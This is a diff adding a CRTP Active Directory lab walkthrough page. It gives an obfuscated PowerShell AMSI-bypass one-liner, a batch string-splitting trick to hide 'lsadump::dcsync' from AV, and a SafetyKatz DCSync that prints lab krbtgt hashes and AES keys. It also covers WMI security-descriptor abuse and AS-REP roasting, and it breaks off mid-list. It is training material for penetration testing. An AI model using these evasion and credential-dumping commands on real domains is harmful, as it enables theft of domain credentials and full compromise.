@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Diamond Ticket - CRTP</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .project-sidebar { padding: 20px; }
+    .project-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .project-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .project-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .project-sidebar a { 
+      display: block; 
+      padding: 8px 12px; 
+      margin: 4px 0; 
+      color: #d6d6d6; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      transition: all 0.2s; 
+    }
+    .project-sidebar a:hover { 
+      background: #2a2a2a; 
+      color: #ffdb70; 
+    }
+    .project-sidebar a.active { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+      font-weight: 600; 
+    }
+    
+    .notion-content { 
+      line-height: 1.6; 
+    }
+    .notion-content img { 
+      max-width: 100%; 
+      height: auto; 
+      margin: 20px 0; 
+      border-radius: 8px; 
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    .notion-content h1 { 
+      font-size: 1.8rem; 
+      margin: 30px 0 20px; 
+      color: #fafafa; 
+    }
+    .notion-content h2 { 
+      font-size: 1.5rem; 
+      margin: 25px 0 15px; 
+      color: #fafafa; 
+    }
+    .notion-content h3 { 
+      font-size: 1.3rem; 
+      margin: 20px 0 10px; 
+      color: #fafafa; 
+    }
+    .notion-content p { 
+      margin: 15px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content ul, .notion-content ol { 
+      margin: 15px 0; 
+      padding-left: 30px; 
+    }
+    .notion-content li { 
+      margin: 5px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content code { 
+      background: #2a2a2a; 
+      padding: 2px 6px; 
+      border-radius: 4px; 
+      font-family: 'Courier New', monospace; 
+      color: #ffdb70; 
+    }
+    .notion-content pre { 
+      background: #1e1e1e; 
+      border-left: 4px solid #ffdb70; 
+      padding: 15px; 
+      margin: 20px 0; 
+      border-radius: 0 8px 8px 0; 
+      overflow-x: auto; 
+    }
+    .notion-content a { 
+      color: #ffdb70; 
+      text-decoration: underline; 
+    }
+    .notion-content strong { 
+      color: #fafafa; 
+      font-weight: 600; 
+    }
+    .notion-content em { 
+      font-style: italic; 
+    }
+    .notion-content figure { 
+      margin: 20px 0; 
+    }
+    .notion-content figcaption { 
+      display: none; 
+    }
+    .main-content { 
+      max-width: 100% !important; 
+    }
+    .about { 
+      max-width: 100% !important; 
+      padding: 20px 40px !important; 
+    }
+    /* Critical: Code Block Formatting */
+    pre code {
+      white-space: pre;
+      word-break: normal;
+      overflow-x: auto;
+      display: block;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Walkthrough</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="project-sidebar">
+          <a href="../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+           <a href="part-01.html">1. PowerShell Detection & Bypass</a>
+           <a href="part-02.html">2. Enumeration Tools</a>
+           <a href="part-03.html">3. Domain Enumeration Techniques</a>
+           <a href="part-04.html">4. Privilege Escalation (Derivative Local Admin)</a>
+           <a href="part-05.html">5. Golden Ticket</a>
+           <a href="part-06.html">6. Silver Ticket & WMI Abuse</a>
+           <a href="part-07.html">7. Diamond Ticket</a>
+           <a href="part-08.html">8. DCSync Attack</a>
+           <a href="part-09.html">9. AS-REP Roasting</a>
+           <a href="part-10.html">10. Unconstrained Delegation + Printer Bug</a>
+           <a href="part-11.html">11. Constrained Delegation</a>
+           <a href="part-12.html">12. Resource-Based Constrained Delegation (RBCD)</a>
+           <a href="part-13.html">13. Trust Enumeration & Abuse</a>
+           <a href="part-14.html">14. Cross-Forest Trust Attacks</a>
+           <a href="part-15.html">15. ADCS Attacks (ESC1, ESC3)</a>
+           <a href="part-16.html">16. Tools Transfer & Execution</a>
+           <a href="part-17.html">17. ASR Rules Bypass (Lateral Movement)</a>
+        </div>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Diamond Ticket</header>
+        <section class="about-text notion-content">
+          <h1>Enumeration</h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807a-9b37-d9c5b82fe2c8" class="">For this attack to work, user must have Replication Rights. We can start by enumerating the User Rights via PowerShell.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803a-bbeb-d58528282d71" class="">Note that, this lab will assume that we do have to AV enabled.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8022-8de0-cd6338146164" class="">We start by executing <a href="https://github.com/OmerYa/Invisi-Shell">Invisi-Shell </a>to bypass all of Powershell security features (ScriptBlock logging, Module logging, Transcription, AMSI) and then  AMSI bypass.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8074-83f4-cafa15f8fedc" class="">Not I’m using the <code>RunWithPathAsAdmin.bat</code> because I’m already an administrator on the machine, otherwise I should be running the <code>RunWithRegistryNonAdmin.bat</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f1-8060-f603fb6e5e05" class=""><code>RunWithPathAsAdmin.bat</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-800d-877b-e269975c5d93" class="image"><a href="images/screenshot_145.png"><img style="width:1445px" src="images/screenshot_145.png"/></a></figure></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8080-a198-c740dace63b7" class="">AMSI Bypass</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8080-81af-dfc9c27e167a" class="code code-wrap"><code class="language-bash">S`eT-It`em ( &#x27;V&#x27;+&#x27;aR&#x27; + &#x27;IA&#x27; + (&#x27;blE:1&#x27;+&#x27;q2&#x27;) + (&#x27;uZ&#x27;+&#x27;x&#x27;) ) ([TYpE]( &quot;{1}{0}&quot;-F&#x27;F&#x27;,&#x27;rE&#x27; ) ) ; ( Get-varI`A`BLE ((&#x27;1Q&#x27;+&#x27;2U&#x27;) +&#x27;zX&#x27; ) -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((&quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#x27;Uti&#x27;+&#x27;l&#x27;),&#x27;A&#x27;,(&#x27;Am&#x27;+&#x27;si&#x27;),(&#x27;.Man&#x27;+&#x27;age&#x27;+&#x27;men&#x27;+&#x27;t.&#x27;),(&#x27;u&#x27;+&#x27;to&#x27;+&#x27;mation.&#x27;),&#x27;s&#x27;,(&#x27;Syst&#x27;+&#x27;em&#x27;) ) ).&quot;g`etf`iElD&quot;( ( &quot;{0}{2}{1}&quot; -f(&#x27;a&#x27;+&#x27;msi&#x27;),&#x27;d&#x27;,(&#x27;I&#x27;+&#x27;nitF&#x27;+&#x27;aile&#x27;) ),( &quot;{2}{4}{0}{1}{3}&quot; -f(&#x27;S&#x27;+&#x27;tat&#x27;),&#x27;i&#x27;,(&#x27;Non&#x27;+&#x27;Publ&#x27;+&#x27;i&#x27;),&#x27;c&#x27;,&#x27;c,&#x27; )).&quot;sE`T`VaLUE&quot;(${n`ULl},${t`RuE} )</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ff-8273-e1cb3e665932" class="">Now let’s start by Importing PowerView.ps1 modules.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f4-a286-c70763a08043" class=""><code>. .\PowerView.ps1</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d1-9a6a-f8d32e7fd76a" class=""><code>Get-DomainObjectAcl -SearchBase &quot;DC=dollarcorp,DC=moneycorp,DC=local&quot; -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match &#x27;replication-get&#x27;) -or ($_.ActiveDirectoryRights -match &#x27;GenericAll&#x27;)} | ForEach-Object {$_ | Add-Member NoteProperty &#x27;IdentityName&#x27; $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match &quot;student451&quot;}</code></p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8098-ad68-e2611d9a0b7e" class="">Explanation</h3></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-800e-bd2b-c3f839b37fe1" class="numbered-list" start="1"><li><strong>Get-DomainObjectAcl</strong>:<div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8077-bb60-c0b35032f530" class="bulleted-list"><li style="list-style-type:disc">This cmdlet retrieves the ACLs (Access Control Lists) for objects in the specified domain.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-805f-aa89-d6e0628bcd60" class="bulleted-list"><li style="list-style-type:disc"><strong>SearchBase</strong>: Specifies the base DN for the search. In this case, it is set to &quot;DC=dollarcorp,DC=moneycorp,DC=local&quot;.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-800b-beff-f0aaf7a8c904" class="bulleted-list"><li style="list-style-type:disc"><strong>SearchScope</strong>: Defines the scope of the search. Here, it is set to &quot;Base&quot;, which means it will only search the base object specified in the SearchBase parameter.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8048-81b0-e5af367cfff7" class="bulleted-list"><li style="list-style-type:disc"><strong>ResolveGUIDs</strong>: This parameter resolves GUIDs to their corresponding names.</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80a5-8532-dc8ee9b08444" class="numbered-list" start="2"><li><strong>Filtering</strong>:<div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8078-aa9b-c164d8f701f1" class="bulleted-list"><li style="list-style-type:disc">The <code>?</code> operator is used to filter the results. It checks if the <code>ObjectAceType</code> matches &quot;replication-get&quot; or if the <code>ActiveDirectoryRights</code> match &quot;GenericAll&quot;. These conditions are used to identify users with DCSync rights.</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8043-86fe-c4b39d915830" class="numbered-list" start="3"><li><strong>Adding IdentityName</strong>:<div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-806d-b6e8-cbd1fc40cea4" class="bulleted-list"><li style="list-style-type:disc">The <code>ForEach-Object</code> cmdlet is used to iterate over the filtered results.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8058-a883-e4ab7d4c11f9" class="bulleted-list"><li style="list-style-type:disc">It adds a new property called &quot;IdentityName&quot; to each object by converting the <code>SecurityIdentifier</code> to a name using the <code>Convert-SidToName</code> function.</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-804c-ba01-d801913f3887" class="numbered-list" start="4"><li><strong>Final Filtering</strong>:<div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8092-9d2d-e9072514fae9" class="bulleted-list"><li style="list-style-type:disc">The final <code>?</code> operator filters the results to only include objects where the <code>IdentityName</code> matches &quot;student451&quot;.</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d7-a32a-d2a150dad9a6" class="">Above by analyzing our student451 Rights, we can see that we do have <code><strong>DS-Replication-Get-Changes-In-Filtered-Set</strong></code> enabled in <code><strong>ObjectAceType</strong></code> property.</p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-800a-b73c-e99239e0365d" class="image"><a href="images/screenshot_152.png"><img style="width:1445px" src="images/screenshot_152.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8061-8422-f95464b933be" class="">OK. we can see above that we do have Replication Rights on our user.<br/>We can use the student Right to do a DCSync attack by requesting KRBTGT hashes, any valid user in the domain or even dump all Domain users Hashes.<br/></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a9-b38e-f6e78af67180" class=""><code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ff-9835-e524f1742451" class="">It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803d-bcf2-d1a8ae9d5e81" class="">Execute argSplit.exe and type:</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e1-a956-c6e018b29d82" class=""><code><strong>lsadump::dcsync</strong></code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8002-b9f7-f6383b329f9c" class="code code-wrap"><code class="language-bash">set &quot;z=c&quot;
+set &quot;y=n&quot;
+set &quot;x=y&quot;
+set &quot;w=s&quot;
+set &quot;v=c&quot;
+set &quot;u=d&quot;
+set &quot;t=:&quot;
+set &quot;s=:&quot;
+set &quot;r=p&quot;
+set &quot;q=m&quot;
+set &quot;p=u&quot;
+set &quot;o=d&quot;
+set &quot;n=a&quot;
+set &quot;m=s&quot;
+set &quot;l=l&quot;
+set &quot;Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-800a-a7a8-c36646500aa1" class="">Invoking SafetyKatz.exe using PELoader.exe.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d3-8a0d-c95766490cbe" class=""><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args &quot;%Pwn% /user:dcorp\krbtgt&quot; &quot;exit”</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80fc-92df-c1f823b74e13" class="code code-wrap"><code class="language-bash">
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/11/2022 10:59:41 PM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
+    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
+    lm  - 0: ea03581a1268674a828bde6ab09db837
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
+      des_cbc_md5       (4096) : 150ea2e934ab6b80
+
+* Primary:Kerberos *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 150ea2e934ab6b80
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  a0e60e247b498de4cacfac3ba615af01
+    02  86615bb9bf7e3c731ba1cb47aa89cf6d
+    03  637dfb61467fdb4f176fe844fd260bac
+    04  a0e60e247b498de4cacfac3ba615af01
+    05  86615bb9bf7e3c731ba1cb47aa89cf6d
+    06  d2874f937df1fd2b05f528c6e715ac7a
+    07  a0e60e247b498de4cacfac3ba615af01
+    08  e8ddc0d55ac23e847837791743b89d22
+    09  e8ddc0d55ac23e847837791743b89d22
+    10  5c324b8ab38cfca7542d5befb9849fd9
+    11  f84dfb60f743b1368ea571504e34863a
+    12  e8ddc0d55ac23e847837791743b89d22
+    13  2281b35faded13ae4d78e33a1ef26933
+    14  f84dfb60f743b1368ea571504e34863a
+    15  d9ef5ed74ef473e89a570a10a706813e
+    16  d9ef5ed74ef473e89a570a10a706813e
+    17  87c75daa20ad259a6f783d61602086aa
+    18  f0016c07fcff7d479633e8998c75bcf7
+    19  7c4e5eb0d5d517f945cf22d74fec380e
+    20  cb97816ac064a567fe37e8e8c863f2a7
+    21  5adaa49a00f2803658c71f617031b385
+    22  5adaa49a00f2803658c71f617031b385
+    23  6d86f0be7751c8607e4b47912115bef2
+    24  caa61bbf6b9c871af646935febf86b95
+    25  caa61bbf6b9c871af646935febf86b95
+    26  5d8e8f8f63b3bb6dd48db5d0352c194c
+    27  3e139d350a9063db51226cfab9e42aa1
+    28  d745c0538c8fd103d71229b017a987ce
+    29  40b43724fa76e22b0d610d656fb49ddd
+
+
+mimikatz(commandline) # exit
+Bye!</code></pre></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8062-a2b2-f6b910479f24" class="">We were able to do a DCSync Attack.</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div></li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80e3-989d-fbd27f11a470" class="bulleted-list"><li><strong>Security Descriptor Abuse</strong><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-801c-9776-cb6d4161c1ec" class="">What is Security Descriptor Abuse?</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80fe-9035-ef33594c3ca8" class="">Security Descriptor Abuse is a technique used by attackers to gain persistence on a system by manipulating the security descriptors of objects in the Active Directory. Security descriptors are used to control access to objects in the Active Directory, and by abusing these descriptors, an attacker can gain unauthorized access to sensitive information and maintain persistence on the system.</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-80a1-9a34-ee8fae6bfde2" class="">How Does Security Descriptor Abuse Work?</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803e-9534-d9c22c48911d" class="">Security descriptor abuse involves manipulating the security descriptors of objects in the Active Directory to grant an attacker unauthorized access to sensitive information. This can be done by adding or modifying access control entries (ACEs) in the security descriptor of an object, which allows the attacker to access the object without being authorized to do so.</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8055-b837-cb1044bab1b1" class="">Types of Security Descriptor Abuse</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e9-bd3c-f2b774781438" class="">There are several types of security descriptor abuse that can be used to gain persistence on a system:</p></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80b6-9063-d98f47000329" class="numbered-list" start="1"><li><strong>DACL Abuse</strong>: This involves manipulating the discretionary access control list (DACL) of an object to grant an attacker unauthorized access to the object. This can be done by adding or modifying ACEs in the DACL to allow the attacker to access the object without being authorized to do so.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-802d-b425-e40d2279c0d1" class="numbered-list" start="2"><li><strong>SACL Abuse</strong>: This involves manipulating the system access control list (SACL) of an object to grant an attacker unauthorized access to the object. This can be done by adding or modifying ACEs in the SACL to allow the attacker to access the object without being authorized to do so.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-804f-9e26-ccb67c407598" class="numbered-list" start="3"><li><strong>Owner and Group Abuse</strong>: This involves manipulating the owner and group of an object to grant an attacker unauthorized access to the object. This can be done by changing the owner or group of an object to an attacker-controlled account, which allows the attacker to access the object without being authorized to do so.</li></ol></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8035-b4bf-ed9413bb9e0d" class="">Let’s modify the host security descriptors for WMI on the DC to allow studentx access to WMI</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-809a-bc10-e80ee2385927" class="">We should start by importing RACE.ps1 module in PowerShell.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80fc-bbe7-dce4b5230bc4" class=""><code>. .\RACE.ps1</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c9-be60-f88a4fdf82e3" class=""><code>Set-RemoteWMI -SamAccountName student451 -ComputerName dcorp-dc -namespace ‘root\cimv2’ -Verbose</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80e8-91e2-c64fba2bea33" class="image"><a href="images/screenshot_153.png"><img style="width:2080px" src="images/screenshot_153.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a2-b761-e32673b39cfb" class="">Now we can execute WMI queries on the DC as student451.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8014-ba30-eaaab863b3dd" class=""><code>gwmi -Class win32_operatingsystem -ComputerName dcorp-dc </code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80dc-8668-f1ec05479f80" class="image"><a href="images/screenshot_154.png"><img style="width:681.9666748046875px" src="images/screenshot_154.png"/></a></figure></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div></li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80ac-87ba-c00b53c3a16b" class="bulleted-list"><li><strong>ASREP-Roasting Attack</strong><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8018-a776-f938143035da" class="">What is AS-REP Roasting?</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8098-8222-c1fc7e904cce" class="">AS-REP Roasting is a type of attack that targets Kerberos authentication protocol. It involves exploiting a known weakness in Kerberos to retrieve the password hash of any Kerberos user accounts that have the &quot;Do not require Kerberos preauthentication&quot; option enabled. This attack is particularly effective against accounts that have weak passwords or use older hashing algorithms.</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8037-b251-fa3bb10e722f" class="">How Does AS-REP Roasting Work?</h3></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80b9-8185-f9da546d30cd" class="numbered-list" start="1"><li><strong>Obtain Access</strong>: The attacker gains access to a domain as an authenticated user. Elevated permissions are not required.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80d7-b63c-c38d938bd7db" class="numbered-list" start="2"><li><strong>Identify Target Accounts</strong>: The attacker uses an LDAP filter or tools like PowerView’s <strong>Get-DomainUser</strong> feature to identify user accounts with the &quot;Do not require Kerberos preauthentication&quot; option enabled.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8084-a951-dd4577949e5c" class="numbered-list" start="3"><li><strong>Request Kerberos Ticket Granting Ticket (TGT)</strong>: The attacker requests a TGT from the Key Distribution Center (KDC) in the name of a target account. The KDC responds with the TGT without requiring the account password as a pre-authentication.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80b5-9577-fa622092ee15" class="numbered-list" start="4"><li><strong>Extract Password Hash</strong>: The attacker extracts the user’s password hash from the AS-REP packet using a tool like Wireshark.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8034-9708-c2d357e9128f" class="numbered-list" start="5"><li><strong>Crack Password</strong>: The attacker uses a tool like HashCat or John the Ripper to crack the password hash and obtain the plaintext password.</li></ol></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8012-9b1d-d31cded79591" class="">Tools Used for AS-REP Roasting</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8042-992c-e55318d6b9c7" class="">Several tools can be used to perform AS-REP Roasting, including:</p></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8054-afa7-d8761eb0ffe5" class="numbered-list" start="1"><li><strong>Rubeus</strong>: This tool can be used to identify all accounts in the domain that do not require Kerberos pre-authentication and extract their AS-REP hashes.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" 